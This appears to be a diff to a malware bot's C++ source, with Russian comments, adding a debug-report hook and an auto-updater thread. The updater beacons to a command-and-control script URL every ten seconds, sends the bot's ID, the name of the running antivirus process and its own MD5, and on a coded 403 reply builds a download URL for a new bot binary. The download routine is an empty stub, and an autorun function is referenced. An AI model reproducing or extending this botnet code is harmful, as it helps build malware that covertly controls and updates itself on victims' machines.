@@ -3,7 +3,9 @@
 
 #include "BotCore.h"
 #include "BotUtils.h"
-//#include "Exception.h"
+#include "HTTPConsts.h"
+#include "BotDef.h"
+#include "DbgRpt.h"
 
 
 //---------------------------------------------------------------------------
@@ -167,10 +169,14 @@ void BOT::Initialize()
 	GetWorkFolderHash();
 
 	GenerateUid(BOT_UID);
+
 	// Включаем создание дампа при исключении
 	// Пытаемся встать в начало списка, что дает нам возможность перехватить
 	// ошибку до возможно установленных системных VEH.
 	//InitialializeGlogalExceptionLogger(TRUE);
+
+	// Инициализируем подсистему статистической отчетности.
+	DebugReportInit();
 }
 
 //----------------------------------------------------------------------------
@@ -322,3 +328,116 @@ bool BOT::AddToAutoRun(PCHAR FileName)
 
 	return Result;
 }
+
+
+//----------------------------------------------------
+//  BotExeMD5 - Функция возвращает MD5 хэш ехе бота
+//----------------------------------------------------
+string BOT::BotExeMD5()
+{
+	string Result = "507535f54ccf135f94e6c495994dcd7b"; // Для тестов левый
+
+	return Result;
+}
+
+
+//****************************************************************************
+//                                  TBotUpdater
+//****************************************************************************
+TBotUpdater::TBotUpdater()
+	: TBotThread(false)
+{
+	Interval = 10000;
+
+	Start();
+}
+//----------------------------------------------------------
+
+void TBotUpdater::DoExecute()
+{
+	// Запускаем цикл автоматического обновления бота
+	while (!Terminated())
+	{
+		DWORD UpdateInterval = Interval;
+
+		Update(UpdateInterval);
+
+		pSleep(UpdateInterval);
+	}
+
+}
+//----------------------------------------------------------
+
+void TBotUpdater::Update(DWORD &UpdateInterval)
+{
+	// Функция выполняет автоматическое обновление бота
+
+	// Интервал обновления в случае ошибки
+	const static DWORD ErrorInterval = 60000;
+
+	PCHAR URL = GetBotScriptURL(SCRIPT_UPDATE_BOT);
+	if (!URL)
+	{
+		UpdateInterval = ErrorInterval;
+		return;
+	}
+
+	// Выполняем запрос
+	string UID = GenerateBotID2();
+	string AV  = GetAntiVirusProcessName();
+	string MD5 = BOT::BotExeMD5();
+
+	TBotStrings Fields;
+
+	Fields.AddValue(HTTP_FIELD_UID,     UID);
+	Fields.AddValue(HTTP_FIELD_ANTIVIR, AV);
+	Fields.AddValue(HTTP_FIELD_MD5,     MD5);
+
+
+	#ifdef CryptHTTPH
+		TCryptHTTP HTTP;
+		HTTP.Password = GetMainPassword2();
+	#else
+		THTTP HTTP;
+	#endif
+
+
+	string Buf;
+
+	HTTP.CheckOkCode = false;
+    bool Done = HTTP.Post(URL, &Fields, Buf);
+
+	if (Done && HTTP.Response.Code == 403 && !Buf.IsEmpty())
+	{
+		// Выполняем обновление
+		TBotStrings Values;
+		Values.SetText(Buf);
+
+		string FileName = Values.GetValue("file_name");
+		MD5     = Values.GetValue("md5");
+
+
+
+		TURL URL;
+
+		URL.Host     = HTTP.Request.Host;
+		URL.Path     = "cfg";
+		URL.Document = FileName;
+
+		string FileURL = URL.URL();
+
+
+		// Загружаем и устанавливаем новую версию
+		DownloadAndSetup(FileURL, MD5);
+    }
+
+	STR::Free(URL);
+
+}
+//----------------------------------------------------------
+
+void TBotUpdater::DownloadAndSetup(const string &FileURL, const string &FileName)
+{
+	// Функция загржает и устанавливает новую версию бота
+}
+//----------------------------------------------------------
